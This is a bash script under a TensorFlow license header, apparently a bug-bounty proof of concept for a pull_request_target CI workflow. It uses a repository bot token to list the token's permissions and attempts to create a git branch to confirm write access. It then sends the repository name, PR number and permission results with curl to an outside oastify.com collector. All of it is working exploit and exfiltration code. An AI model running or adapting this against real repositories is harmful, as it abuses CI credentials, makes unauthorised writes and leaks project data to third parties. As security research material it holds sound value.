#!/usr/bin/env bash
# Copyright 2026 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
#
# ============================================================
# OSS VRP PoC #2 — Token permission enumeration
# Proves github.token write scope in pull_request_target
# ============================================================

set -e
set -u

OOB_HOST="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"

echo "=== PoC #2: Token Permission Enumeration ==="

# 1. Check X-OAuth-Scopes header — shows token scope
SCOPE_HEADER=$(curl -si "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-github-media-type" || echo "no-scope-header")

echo "Scope headers: ${SCOPE_HEADER}"

# 2. Check actual repo permissions returned in API
PERMS=$(curl -s "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); p=d.get('permissions',{}); print('push='+str(p.get('push',False))+',admin='+str(p.get('admin',False))+',maintain='+str(p.get('maintain',False))+',triage='+str(p.get('triage',False))+',pull='+str(p.get('pull',False)))" 2>/dev/null || echo "perms-parse-failed")

echo "Permissions: ${PERMS}"

# 3. Check if we can create a ref (proves contents:write)
CREATE_REF=$(curl -s -o /dev/null -w "%{http_code}" \
  -X POST "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -d '{"ref":"refs/heads/osvrp-write-test-DELETE-ME","sha":"HEAD"}' 2>/dev/null || echo "000")
echo "CreateRef HTTP status: ${CREATE_REF}"
# 201 = write confirmed, 403 = read-only, 422 = write but SHA invalid

# 4. Check token meta endpoint
TOKEN_META=$(curl -s "https://api.github.com" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -I 2>/dev/null | grep -i "x-oauth\|x-ratelimit" || echo "no-meta")
echo "Token meta: ${TOKEN_META}"

# 5. OOB exfil — perms + createref result
PERMS_ENC=$(echo "${PERMS}" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null || echo "enc-failed")
curl -sk "https://${OOB_HOST}/perms?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&perms=${PERMS_ENC}&createref=${CREATE_REF}" || true

echo "=== PoC #2 complete ==="
exit 0
